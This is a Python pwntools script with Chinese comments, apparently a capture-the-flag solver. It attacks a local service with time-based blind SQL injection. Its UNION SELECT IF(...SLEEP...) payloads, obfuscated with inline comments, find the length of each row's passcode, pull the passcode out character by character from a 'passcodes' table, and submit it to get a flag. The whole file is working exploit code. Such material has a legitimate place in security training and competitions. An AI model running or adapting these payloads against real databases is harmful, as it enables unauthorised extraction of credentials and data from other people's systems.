#!/usr/bin/env python3
import time
from pwn import *

# --- 配置 ---
HOST = '127.0.0.1'
PORT = 52594

def get_passcode_from_row(row_offset):
    """
    从指定行(row_offset)提取一个完整的passcode。
    """
    log.info(f"[*] 正在从第 {row_offset + 1} 行提取 Passcode...")
    SLEEP_TIME = 2

    # --- 阶段 1: 确定该行 Passcode 的长度 ---
    passcode_length = -1
    for i in range(1, 100):
        with log.progress(f'正在测试第 {row_offset + 1} 行的长度: {i}') as p:
            # 使用 LIMIT {row_offset}, 1 来定位到特定行
            payload = f"'' UNION/**/SELECT IF((SELECT LENGTH(passcode) FROM passcodes LIMIT {row_offset}, 1) = {i}, SLEEP({SLEEP_TIME}), 'a') -- "
            
            start_time = time.time()
            try:
                r = remote(HOST, PORT, timeout=SLEEP_TIME + 2, level='error')
                r.recvuntil(b': ', timeout=SLEEP_TIME + 2)
                r.sendline(payload.encode())
                r.recvall(timeout=SLEEP_TIME + 2)
                r.close()
            except Exception:
                pass
            end_time = time.time()

            if end_time - start_time >= SLEEP_TIME:
                passcode_length = i
                p.success(f"第 {row_offset + 1} 行的 Passcode 长度为: {passcode_length}")
                break
    
    if passcode_length == -1:
        # 如果在长度为1时都没有延时，很可能说明该行不存在
        if i == 1:
            log.warning(f"[-] 在第 {row_offset + 1} 行未探测到数据，可能已到表末尾。")
        else:
            log.failure(f"[-] 未能确定第 {row_offset + 1} 行的 Passcode 长度。")
        return None

    # --- 阶段 2: 根据长度提取该行 Passcode ---
    passcode = ""
    CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_!{}"

    for i in range(1, passcode_length + 1):
        found_char_for_pos = False
        for char in CHARSET:
            with log.progress(f"正在提取第 {row_offset + 1} 行, 第 {i}/{passcode_length} 位字符") as p:
                p.status(f"尝试: '{char}'")
                payload = f"'' UNION/**/SELECT IF((SELECT SUBSTR(passcode, {i}, 1) FROM passcodes LIMIT {row_offset}, 1) = '{char}', SLEEP({SLEEP_TIME}), 'a') -- "
                
                start_time = time.time()
                try:
                    r = remote(HOST, PORT, timeout=SLEEP_TIME + 2, level='error')
                    r.recvuntil(b': ', timeout=SLEEP_TIME + 2)
                    r.sendline(payload.encode())
                    r.recvall(timeout=SLEEP_TIME + 2)
                    r.close()
                except Exception:
                    pass
                end_time = time.time()

                if end_time - start_time >= SLEEP_TIME:
                    passcode += char
                    p.success(f"找到字符: '{char}'! 当前 Passcode: {passcode}")
                    found_char_for_pos = True
                    break
        
        if not found_char_for_pos:
            log.failure(f"[-] 提取失败！请检查字符集(CHARSET)是否完整。")
            return "ERROR_CHARSET_INCOMPLETE"

    return passcode

def submit_passcode(passcode):
    """
    提交passcode并返回响应是否成功（即响应是否为空）。
    """
    log.info(f"[*] 正在提交 Passcode: '{passcode}'")
    try:
        p = remote(HOST, PORT, timeout=5)
        p.recvuntil(b': ')
        p.sendline(passcode.encode())
        flag_response = p.recvall(timeout=5).decode().strip()
        p.close()

        if flag_response:
            log.success("[+] 成功！收到Flag响应:")
            print(flag_response)
            return True
        else:
            log.warning("[-] 响应为空，此 Passcode 无效。")
            return False
            
    except Exception as e:
        log.failure(f"[-] 提交 Passcode 失败: {e}")
        return False

if __name__ == '__main__':
    MAX_ROWS_TO_CHECK = 10  # 尝试检查表中的前10行

    for i in range(MAX_ROWS_TO_CHECK):
        print("\n" + "="*50)
        
        # 从第 i 行获取 passcode
        passcode = get_passcode_from_row(row_offset=i)
        
        # 如果函数返回了passcode (不是None或错误字符串)
        if passcode and "ERROR" not in passcode:
            # 提交 passcode 并检查结果
            if submit_passcode(passcode):
                log.success("🎉🎉🎉 已找到正确的 Passcode 并获得 Flag! 🎉🎉🎉")
                break
        else:
            # 如果 get_passcode 返回 None，说明可能没有更多行了
            log.info("[*] 攻击流程结束。")
            break
    else:
        log.failure(f"[-] 已尝试检查前 {MAX_ROWS_TO_CHECK} 行，仍未找到正确 Passcode。")